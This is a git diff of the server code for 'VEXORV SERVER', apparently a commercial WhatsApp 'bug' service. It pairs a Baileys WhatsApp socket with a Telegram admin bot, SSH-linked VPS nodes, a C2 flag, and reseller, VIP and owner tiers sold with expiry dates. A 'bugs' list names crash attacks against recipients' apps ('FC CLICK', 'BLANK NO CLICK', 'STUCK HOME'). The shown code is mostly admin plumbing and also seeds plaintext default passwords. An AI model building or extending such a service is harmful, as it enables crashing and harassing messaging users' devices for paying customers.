@@ -1,5 +1,8 @@
+// index.js — VEXORV SERVER (FIXED EDITION) 🔥
+
 const originalStdoutWrite = process.stdout.write.bind(process.stdout);
 const originalStderrWrite = process.stderr.write.bind(process.stderr);
+
 process.on('unhandledRejection', (reason, promise) => {
   console.log('Unhandled Rejection:', reason);
 });
@@ -19,6 +22,7 @@ process.stdout.write = (chunk, encoding, callback) => {
   ) return true;
   return originalStdoutWrite(chunk, encoding, callback);
 };
+
 process.stderr.write = (chunk, encoding, callback) => {
   if (typeof chunk === 'string' && (
     chunk.includes('Closing stale open session') ||
@@ -32,6 +36,8 @@ process.stderr.write = (chunk, encoding, callback) => {
 };
 
 const safeExit = process.exit;
+
+// ========== DEPENDENCIES & MODULES ==========
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -43,7 +49,6 @@ const {
     makeInMemoryStore,
     prepareWAMessageMedia,
     generateWAMessageFromContent,
-    MediaType,
     areJidsSameUser,
     WAMessageStatus,
     downloadAndSaveMediaMessage,
@@ -111,164 +116,558 @@ const {
     viewOnceMessage,
     groupStatusMentionMessage,
 } = require('@whiskeysockets/baileys');
+
 const express = require("express");
 const bodyParser = require('body-parser');
 const readline = require("readline");
 const crypto = require("crypto");
 const cors = require('cors');
-const app = express();
+const multer = require('multer');
 const TelegramBot = require("node-telegram-bot-api");
 const fs = require("fs");
 const fsPromises = require('fs').promises;
 const path = require('path');
 const pino = require('pino');
-const P = require('pino')
-const axios = require('axios')
-const vm = require('vm')
+const P = require('pino');
+const axios = require('axios');
+const vm = require('vm');
 const os = require('os');
 const WebSocket = require('ws');
 const http = require('http');
+const si = require('systeminformation'); 
+const { Client } = require('ssh2');
 const config = require('./config.js');
+const telegramDataPath = "telegram.json";
+const STORAN_FILE = './storan.json';
+const QR_CODE_PAYMENT = config.QR_CODE_PAYMENT;
+
+const STORAN_DATA = {
+  pending: [],
+  history: []
+};
+
+function loadStoranData() {
+  if (!fs.existsSync(STORAN_FILE)) {
+    fs.writeFileSync(STORAN_FILE, JSON.stringify(STORAN_DATA, null, 2));
+  }
+  return JSON.parse(fs.readFileSync(STORAN_FILE));
+}
+
+function saveStoranData(data) {
+  fs.writeFileSync(STORAN_FILE, JSON.stringify(data, null, 2));
+}
+
+function generateStoranId() {
+  return 'STOR-' + Date.now().toString(36).toUpperCase();
+}
+
+function loadTelegramConfig() {
+  if (!fs.existsSync(telegramDataPath)) {
+    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
+      devList: [],
+      ownerList: [], 
+      ptList: [],
+      vipList: [],
+      resellerList: [],
+      fullupList: [],
+      userList: []
+    }, null, 2));
+  }
+  return JSON.parse(fs.readFileSync(telegramDataPath));
+}
+
+function getFormattedUsers() {
+  const db = loadDatabase();
+  if (db.length === 0) return "Belum ada user terdaftar.";
+  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
+}
+
+function getMainKeyboard(role) {
+    const style = styles[styleIndex];
+    styleIndex++;
+    if (styleIndex >= styles.length) styleIndex = 0;
+
+    let buttons = [];
+
+    if (role === 'developer') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
+            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
+            [{ text: "👑 Buat Akun Owner", callback_data: "create_owner", style }],
+            [{ text: "👑 Buat Akun Developer", callback_data: "create_developer", style }],
+            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
+            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
+            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
+            [{ text: "➕ Add Owner", callback_data: "add_owner", style }],
+            [{ text: "➕ Add Developer", callback_data: "add_developer", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else if (role === 'owner') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
+            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
+            [{ text: "👑 Buat Akun Owner", callback_data: "create_owner", style }],
+            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
+            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
+            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
+            [{ text: "➕ Add Owner", callback_data: "add_owner", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else if (role === 'pt') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
+            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
+            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
+            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
+            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else if (role === 'reseller') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
+            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
+            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else if (role === 'vip') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
+            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
+            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else if (role === 'fullup') {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
+            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List User", callback_data: "list_user", style }],
+            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    } else {
+        buttons = [
+            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
+            [{ text: "📦 Storan", callback_data: "storan", style }],
+            [{ text: "📋 List Command", callback_data: "list_command", style }]
+        ];
+    }
+
+    return { inline_keyboard: buttons };
+}
+
+const randomvidios = config.randomVideos;
+
+const getRandomVidio = () => randomvidios[Math.floor(Math.random() * randomvidios.length)];
+
+const menuEffects = [
+  "5104841245755180586",
+  "5107584321108051014",
+  "5159385139981059251",
+  "5046509860389126442"
+];
+
+const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
+
+// ==========================================
+// TELEGRAM BOT CONFIGURATION
+// ==========================================
+const token = config.Token; 
+const bot = new TelegramBot(token, { polling: true });
+
+const telegramConfig = {
+    ownerId: config.IDOwn,
+    ownerUsername: config.OwnerUsn,
+    channelUsername: config.ChanelUsn,
+    botUsername: config.BotUsn
+};
+
+// FIX: TARGET_GROUP_ID pake string
+const TARGET_GROUP_ID = config.IdGb;
+
+// ========== VARIABEL INFORMASI ==========
+let informasiText = "Vexorv Server";
+let tanggalText = "";
+let hariText = "";
+
+// ========== FUNGSI KIRIM PESAN DENGAN FOTO + BUTTON ==========
+const fotoUrls = config.Foto;
+
+function getRandomFoto() {
+  return fotoUrls[Math.floor(Math.random() * fotoUrls.length)];
+}
+
+function getDefaultButtons() {
+    const owner = telegramConfig.ownerUsername || 'Chs_Caze';
+    const channel = telegramConfig.channelUsername || 'Chs_Caze';
+    const botName = telegramConfig.botUsername || 'scarrydeathckey_bot';
+    return {
+        inline_keyboard: [
+            [
+                {
+                    text: "👑 OWNER",
+                    url: `https://t.me/${owner}`,
+                    style: "primary"
+                },
+                {
+                    text: "📢 CHANNEL",
+                    url: `https://t.me/${channel}`,
+                    style: "primary"
+                },
+                {
+                    text: "🤖 CHAT BOT",
+                    url: `https://t.me/${botName}`,
+                    style: "primary"
+                }
+            ]
+        ]
+    };
+}
+
+// ─── FIXED sendWithPhoto ──────────────────────────────────────────────
+async function sendWithPhoto(chatId, text, extra = {}) {
+  if (!chatId) {
+    console.error('[SEND PHOTO] chatId kosong!');
+    return;
+  }
+
+  const foto = getRandomFoto();
+  const buttons = getDefaultButtons();
+  
+  let finalReplyMarkup = buttons;
+  if (extra.reply_markup) {
+    const existing = extra.reply_markup.inline_keyboard || [];
+    finalReplyMarkup.inline_keyboard = [...buttons.inline_keyboard, ...existing];
+  }
+  
+  const cleanText = text
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/&(?![a-zA-Z]+;)/g, '&amp;');
+  
+  try {
+    await bot.sendPhoto(chatId, foto, {
+      caption: cleanText,
+      parse_mode: "HTML",
+      reply_markup: finalReplyMarkup,
+      ...extra
+    });
+  } catch (e) {
+    console.error('[SEND PHOTO ERROR]', e.message);
+    try {
+      await bot.sendPhoto(chatId, foto, {
+        caption: cleanText.replace(/<[^>]*>/g, ''),
+        reply_markup: finalReplyMarkup,
+        ...extra
+      });
+    } catch (e2) {
+      console.error('[SEND PHOTO FALLBACK ERROR]', e2.message);
+      try {
+        await bot.sendMessage(chatId, cleanText.replace(/<[^>]*>/g, ''), {
+          reply_markup: finalReplyMarkup,
+          ...extra
+        });
+      } catch (e3) {
+        console.error('[SEND PHOTO LAST RESORT ERROR]', e3.message);
+      }
+    }
+  }
+}
+
+// ─── safeSendMessage ──────────────────────────────────────────────────
+async function safeSendMessage(chatId, text, extra = {}) {
+  if (!chatId) return;
+  
+  const cleanText = text
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/&(?![a-zA-Z]+;)/g, '&amp;');
+  
+  try {
+    await bot.sendMessage(chatId, cleanText, {
+      parse_mode: "HTML",
+      ...extra
+    });
+  } catch (e) {
+    console.error('[SAFE SEND ERROR]', e.message);
+    try {
+      await bot.sendMessage(chatId, cleanText.replace(/<[^>]*>/g, ''), {
+        ...extra
+      });
+    } catch (e2) {
+      console.error('[SAFE SEND FALLBACK ERROR]', e2.message);
+    }
+  }
+}
+
+// ─── FIXED broadcastToGroup ────────────────────────────────────────────
+async function broadcastToGroup(message) {
+    if (!TARGET_GROUP_ID) {
+        console.log('[BROADCAST] TARGET_GROUP_ID tidak diset, skip.');
+        return;
+    }
+
+    try {
+        // CEK APAKAH BOT SUDAH JOIN GROUP
+        try {
+            const chat = await bot.getChat(TARGET_GROUP_ID);
+            console.log('[BROADCAST] Group ditemukan:', chat.title || chat.id);
+        } catch (e) {
+            console.error('[BROADCAST] Bot belum join group atau group tidak valid!');
+            console.error('[BROADCAST] Error:', e.message);
+            try {
+                await bot.sendMessage(OWNER_ID, 
+                    `⚠️ *ERROR BROADCAST*\n\n` +
+                    `Bot belum join ke group target!\n` +
+                    `Group ID: ${TARGET_GROUP_ID}\n` +
+                    `Error: ${e.message}\n\n` +
+                    `✅ SOLUSI: Undang bot ke group terlebih dahulu!`
+                );
+            } catch (e2) {}
+            return;
+        }
+
+        await sendWithPhoto(TARGET_GROUP_ID, message);
+    } catch (e) {
+        console.error('[BROADCAST] Gagal kirim ke group:', e.message);
+    }
+}
+
+// =========================================================================
+// MIDDLEWARE TAMBAHAN
+// =========================================================================
+app.use(cors()); 
+app.use(express.json()); 
+app.use(bodyParser.json({ limit: '500mb' }));
+app.use('/uploads', express.static('uploads'));
+
+// ─── MULTER STORAGE ─────────────────────────────────────────────────
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    let folder = 'uploads/others';
+    if (file.fieldname === 'video') folder = 'uploads/videos';
+    else if (file.fieldname === 'profilePic') folder = 'uploads/profiles';
+    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
+    cb(null, folder);
+  },
+  filename: (req, file, cb) => {
+    const ext = path.extname(file.originalname);
+    cb(null, `${Date.now()}-${Math.random().toString(36).substring(7)}${ext}`);
+  }
+});
+
+const socialUpload = multer({
+  storage,
+  limits: { fileSize: 100 * 1024 * 1024 }
+});
+
+// ========== RATE LIMITER ==========
+const rateLimitMap = new Map();
+
+function rateLimiter(req, res, next) {
+  const key = (req.query && req.query.key) || (req.body && req.body.key) || req.ip;
+  if (!key) return next();
+
+  const now = Date.now();
+  const windowMs = 60000;
+  const maxRequests = 60;
+
+  if (!rateLimitMap.has(key)) {
+    rateLimitMap.set(key, []);
+  }
+
+  const timestamps = rateLimitMap.get(key);
+  const validTimestamps = timestamps.filter(ts => now - ts < windowMs);
+  
+  if (validTimestamps.length >= maxRequests) {
+    console.warn(`[🚫 RATE LIMIT] IP ${key} melebihi batas ${maxRequests} req/menit.`);
+    return res.status(429).json({
+      valid: false,
+      rateLimit: true,
+      message: `Terlalu banyak permintaan! Maksimal ${maxRequests} request per menit.`,
+      retryAfter: Math.ceil((validTimestamps[0] + windowMs - now) / 1000)
+    });
+  }
+
+  validTimestamps.push(now);
+  rateLimitMap.set(key, validTimestamps);
+  next();
+}
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, timestamps] of rateLimitMap) {
+    const valid = timestamps.filter(ts => now - ts < 60000);
+    if (valid.length === 0) {
+      rateLimitMap.delete(key);
+    } else {
+      rateLimitMap.set(key, valid);
+    }
+  }
+}, 60000);
+
+app.use(rateLimiter);
+
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, DELETE");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
+  next();
+});
+
+// ========== DATABASE CACHING ==========
+let dbCache = null;
+let dbCacheTime = 0;
+const DB_CACHE_TTL = 5000;
+
+function loadDatabaseCached() {
+  const now = Date.now();
+  if (dbCache && (now - dbCacheTime < DB_CACHE_TTL)) {
+    return dbCache;
+  }
+  dbCache = loadDatabase();
+  dbCacheTime = now;
+  return dbCache;
+}
+
+function invalidateCache() {
+  dbCache = null;
+  dbCacheTime = 0;
+}
+
+// ========== VARIABLES & CONFIGURATION ==========
 let wsClients = {};
 let chatList = [];
 const CHAT_FILE = 'chat.json';
-const { Client } = require('ssh2');
 const DB_PATH = "./database.json";
 const SESSION_PATH = path.join(__dirname, "permenmd");
 const THIRTY_MINUTES = 30 * 60 * 1000;
 const qrCodes = {};
 let activeKeys = {};
 const KEY_FILE = path.join(__dirname, 'keyList.json');
+let createAccountState = {};
+let addRoleState = {};
+let deleteUserState = {};
+let setExpireState = {};
+let menuMsg = null;
+let menuAnimation = null;
+const styles = ["primary", "success", "danger", "warning"];
+let styleIndex = 0;
+
 const bugs = [
-  { bug_id: "xfcui", bug_name: "CRASH UI" },
-  { bug_id: "fcc", bug_name: "FORCLOSE ONE MSG" },
-  { bug_id: "fc", bug_name: "DELAY INVISIBLE PERMA" },
-  { bug_id: "androidfrz", bug_name: "CRASH HOME" },
-  { bug_id: "clickcrash", bug_name: "NOTIF CRASH"},
-  { bug_id: "delay", bug_name: "DELAY FREZZ"},
-  { bug_id: "iosXv", bug_name: "BLANK FREEZ"},
-  { bug_id: "roid_group", bug_gb: "DELAY GB" },
+  { bug_id: "delayv1", bug_name: "DELAY V1" },
+  { bug_id: "delayhard", bug_name: "DELAY HARD" },
+  { bug_id: "blank", bug_name: "BLANK NO CLICK" },
+  { bug_id: "force", bug_name: "FC CLICK" },
+  { bug_id: "fcno", bug_name: "FC NO CLICK" },
+  { bug_id: "stuck", bug_name: "STUCK HOME" },
 ];
 let cncActive = true;
 let vpsList = [];
-let vpsConnections = {}
+let vpsConnections = {};
 const VPS_FILE = 'vps.json';
-let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
-fs.watchFile("keyList.json", () => {
-  console.log("[📂] keyList.json changed, reloading...");
-  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
-});
 
-if (fs.existsSync(CHAT_FILE)) {
-  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
-}
+const OWNER_ID = 1927022757; 
 
-function saveChat() {
-  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
-}
-
-function sanitize(input) {
-  return String(input)
-    .replace(/[<>]/g, '')
-    .replace(/[\r\n]/g, ' ')
-    .slice(0, 250);
-}
-
-const TOKEN = config.TOKEN;
-const bot = new TelegramBot(TOKEN, { polling: true });
-
-async function appendLogAsync(filePath, data) {
-  try {
-    if (fs.existsSync(filePath)) {
-      const stats = fs.statSync(filePath);
-      if (stats.size > 5 * 1024 * 1024) {
-        fs.writeFileSync(filePath, '');
-      }
-    }
-    await fsPromises.appendFile(filePath, data);
-  } catch (err) {
-    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
-  }
-}
-
-async function autoRefresh() {
-  try {
-    if (!fs.existsSync(SESSION_PATH)) {
-      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
-    } else {
-      let deletedCount = 0;
-      const userFolders = fs.readdirSync(SESSION_PATH);
-
-      for (const userFolder of userFolders) {
-        const userPath = path.join(SESSION_PATH, userFolder);
-        if (!fs.lstatSync(userPath).isDirectory()) continue;
-
-        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
-        if (!hasJson) {
-          fs.rmSync(userPath, { recursive: true, force: true });
-          deletedCount++;
-        }
-      }
-      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
-    }
-
-    console.log("[AUTO REFRESH] Auto restart dijalankan...");
-
-    setTimeout(() => {
-      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
-    }, 8000);
-
-    setTimeout(() => {
-      console.log("[AUTO REFRESH] Process restart server");
-      process.exit(0);
-    }, 5000);
-
-  } catch (err) {
-    console.error("[AUTO REFRESH] Error", err);
-  }
-}
-
+// ========== GLOBAL VARIABLES ==========
+let informationText = "Vexorv Server - Chs_Caze";
 const LOGS_DIR = path.join(__dirname, 'user_logs');
-
-function hapusIsiUserLogs() {
-  if (!fs.existsSync(LOGS_DIR)) {
-    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
-    return;
-  }
-
-  const files = fs.readdirSync(LOGS_DIR);
-
-  for (const file of files) {
-    const filePath = path.join(LOGS_DIR, file);
-    fs.rmSync(filePath, { recursive: true, force: true });
-  }
-
-  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
-}
 
 if (!fs.existsSync(LOGS_DIR)) {
   fs.mkdirSync(LOGS_DIR, { recursive: true });
-  console.log("[LOGS] Folder 'user_logs' dibuat.");
+}
+
+// ========== BANNED USERS (BAN SYSTEM) ==========
+const BANNED_FILE = path.join(__dirname, 'banned.json');
+
+function loadBannedUsers() {
+    if (fs.existsSync(BANNED_FILE)) {
+        try {
+            const data = JSON.parse(fs.readFileSync(BANNED_FILE, 'utf8'));
+            return data.banned || [];
+        } catch(e) {
+            console.log('[BAN] Error loading banned file, creating new one');
+        }
+    }
+    return [];
+}
+
+function saveBannedUsers(bannedList) {
+    fs.writeFileSync(BANNED_FILE, JSON.stringify({ banned: bannedList, updated: new Date().toISOString() }, null, 2));
+}
+
+function isUserBanned(userId) {
+    const banned = loadBannedUsers();
+    return banned.includes(userId);
+}
+
+function banUser(userId) {
+    const banned = loadBannedUsers();
+    if (!banned.includes(userId)) {
+        banned.push(userId);
+        saveBannedUsers(banned);
+        return true;
+    }
+    return false;
+}
+
+function unbanUser(userId) {
+    const banned = loadBannedUsers();
+    const index = banned.indexOf(userId);
+    if (index !== -1) {
+        banned.splice(index, 1);
+        saveBannedUsers(banned);
+        return true;
+    }
+    return false;
 }
 
 function saveUserLog(username, type, title, description) {
   try {
     const userLogPath = path.join(LOGS_DIR, `${username}.json`);
     let logs = [];
-
     if (fs.existsSync(userLogPath)) {
       logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
     }
-
     logs.push({
       type: type,
       title: title,
       description: description,
       timestamp: Date.now()
     });
-
     fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
     console.log(`[LOGS] Activity saved for ${username}: ${type}`);
   } catch (err) {
@@ -276,236 +675,1496 @@ function saveUserLog(username, type, title, description) {
   }
 }
 
+function hapusIsiUserLogs() {
+  if (!fs.existsSync(LOGS_DIR)) {
+    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
+    return;
+  }
+  const files = fs.readdirSync(LOGS_DIR);
+  for (const file of files) {
+    const filePath = path.join(LOGS_DIR, file);
+    fs.rmSync(filePath, { recursive: true, force: true });
+  }
+  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
+}
+
+// ========== HELPER FUNCTIONS ==========
+function isGroupChat(chatId) {
+    return chatId < 0;
+}
+
+function sanitize(text) {
+    if (typeof text !== 'string') return text;
+    return text.replace(/[<>]/g, '');
+}
+
+// =========================================================
+// ═══ ROLE HIERARCHY SYSTEM ═══
+// =========================================================
+const roleHierarchy = {
+    creator: ['developer', 'staf', 'exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    developer: ['staf', 'exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    staf: ['exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    exec: ['vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    vvip: ['svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    svip: ['owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'],
+    owner: ['ceo', 'mod', 'pt', 'reseller', 'full up'],
+    ceo: ['mod', 'pt', 'reseller', 'full up'],
+    mod: ['pt', 'reseller', 'full up'],
+    pt: ['reseller', 'full up'],
+    reseller: ['full up'],
+    'full up': []
+};
+
+const validRoles = ['creator', 'developer', 'staf', 'exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller', 'full up'];
+
+function getRoleLevel(role) {
+    const levels = {
+        creator: 11,
+        developer: 10,
+        staf: 9,
+        exec: 8,
+        vvip: 7,
+        svip: 6,
+        owner: 5,
+        ceo: 4,
+        mod: 3,
+        pt: 2,
+        reseller: 1,
+        'full up': 0
+    };
+    return levels[role] ?? -1;
+}
+
+function canCreateRole(creatorRole, targetRole) {
+    if (targetRole === 'full up') return true;
+    if (!roleHierarchy[creatorRole]) return false;
+    return roleHierarchy[creatorRole].includes(targetRole);
+}
+
+function hasBotAccess(role) {
+    return validRoles.includes(role);
+}
+
+// ========== DATABASE FUNCTIONS ==========
+const loadDatabase = () => {
+  try {
+    const data = fs.readFileSync(DB_PATH, 'utf8');
+    const parsed = JSON.parse(data);
+    if (!parsed.users) parsed.users = [];
+    if (!parsed.posts) parsed.posts = [];
+    if (!parsed.nextUserId) parsed.nextUserId = 4;
+    if (!parsed.nextPostId) parsed.nextPostId = 2;
+    return parsed;
+  } catch (e) {
+    const defaultDB = {
+      users: [
+        { id: 'u1', name: 'ZAMZZZ DEWA', username: '@zamzzz_dewa', password: 'zamzzz123', profilePic: null, followers: ['u2', 'u3'], following: ['u2'] },
+        { id: 'u2', name: 'SI GOBLOK KEREN', username: '@goblock_keren', password: 'goblock123', profilePic: null, followers: ['u1'], following: ['u3'] },
+        { id: 'u3', name: 'EMPIK MANIA', username: '@empik_mania', password: 'empik123', profilePic: null, followers: [], following: ['u1', 'u2'] }
+      ],
+      posts: [
+        {
+          id: 'p1',
+          userId: 'u1',
+          username: '@zamzzz_dewa',
+          caption: 'EMPIK ENAK BANGET GOBLOK! 😈🔥',
+          videoUrl: '/uploads/videos/banner.mp4',
+          thumbnail: null,
+          createdAt: new Date(Date.now() - 3600000).toISOString(),
+          likes: ['u2', 'u3'],
+          comments: [
+            { userId: 'u2', username: '@goblock_keren', text: 'EMPING!', createdAt: new Date(Date.now() - 1800000).toISOString() },
+            { userId: 'u3', username: '@empik_mania', text: 'GUA MAU!', createdAt: new Date(Date.now() - 900000).toISOString() }
+          ]
+        }
+      ],
+      nextUserId: 4,
+      nextPostId: 2
+    };
+    fs.writeFileSync(DB_PATH, JSON.stringify(defaultDB, null, 2));
+    return defaultDB;
+  }
+};
+
+function saveDatabase(data) {
+  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
+  invalidateCache();
+}
+
+function writeDB(data) {
+  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
+  invalidateCache();
+}
+
+function getUserRoleFromDatabase(telegramId) {
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.telegramId === telegramId || u.username === String(telegramId));
+    if (user) return user.role || 'full up';
+    if (telegramId === OWNER_ID || (telegramConfig.ownerId && telegramConfig.ownerId === telegramId)) {
+        return 'owner';
+    }
+    return null;
+}
+
+function isTelegramAuthorized(userId, requiredRole = null) {
+    if (userId === OWNER_ID) return true;
+    if (telegramConfig.ownerId === userId) return true;
+    
+    const userRole = getUserRoleFromDatabase(userId);
+    if (!userRole) return false;
+    
+    if (requiredRole) {
+        return getRoleLevel(userRole) >= getRoleLevel(requiredRole);
+    }
+    return true;
+}
+
+// ─── PERINTAH /listuser ──────────────────────────────────────────────
+bot.onText(/^\/listuser$/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isTelegramAuthorized(userId, 'admin')) {
+        return sendWithPhoto(chatId, "❌ Akses ditolak. Hanya admin yang dapat melihat daftar user.");
+    }
+
+    const db = loadDatabaseCached();
+    if (db.users.length === 0) {
+        return sendWithPhoto(chatId, "📋 Tidak ada user terdaftar.");
+    }
+
+    db.users.sort((a, b) => getRoleLevel(b.role) - getRoleLevel(a.role));
+
+    let message = "📋 DAFTAR SEMUA USER\n\n";
+    const emojis = {
+        creator: '👑', developer: '💻', staf: '👑', exec: '⭐', vvip: '💎', svip: '💜',
+        owner: '👑', ceo: '💼', mod: '🛡️', pt: '🔧',
+        reseller: '💰', 'full up': '👤'
+    };
+
+    db.users.forEach(u => {
+        const emoji = emojis[u.role] || '👤';
+        const roleDisplay = u.role.toUpperCase();
+        message += `${emoji} ${u.username} | ${roleDisplay} | Exp: ${u.expiredDate}\n`;
+    });
+
+    await sendWithPhoto(chatId, message);
+});
+
+// ─── PERINTAH /delkey ──────────────────────────────────────────────
+bot.onText(/^\/delkey,\s*(.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const username = match[1].trim();
+
+    if (!username) {
+        return sendWithPhoto(chatId, "❌ Username tidak boleh kosong. Gunakan: `/delkey,username`");
+    }
+
+    if (!isTelegramAuthorized(userId, 'admin')) {
+        return sendWithPhoto(chatId, "❌ Akses ditolak. Hanya admin yang dapat menghapus user.");
+    }
+
+    const db = loadDatabase();
+    const index = db.users.findIndex(u => u.username === username);
+    if (index === -1) {
+        return sendWithPhoto(chatId, `❌ User *${username}* tidak ditemukan.`);
+    }
+
+    const deletedUser = db.users[index];
+    db.users.splice(index, 1);
+    saveDatabase(db);
+
+    saveUserLog(
+        username,
+        "delete",
+        "Akun dihapus oleh admin",
+        `Dihapus oleh: ${msg.from.username || msg.from.first_name} (ID: ${userId})`
+    );
+
+    await sendWithPhoto(chatId, `✅ User *${username}* berhasil dihapus.`);
+    await broadcastToGroup(`🗑️ *DELETE USER*\n👤 Username: ${username}\n👮‍♂️ Dihapus oleh: ${msg.from.username || msg.from.first_name}`);
+});
+
+// ─── PERINTAH /addrole ──────────────────────────────────────────────
+bot.onText(/^\/addrole(?: (.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return sendWithPhoto(chatId, "❌ Format salah. Gunakan `/addrole role` via reply atau `/addrole id|role`");
+    }
+
+    let targetTelegramId = null;
+    let targetRole = "";
+
+    if (msg.reply_to_message) {
+        targetTelegramId = msg.reply_to_message.from.id;
+        targetRole = match[1].trim().toLowerCase();
+    } else {
+        const args = match[1].trim().split('|');
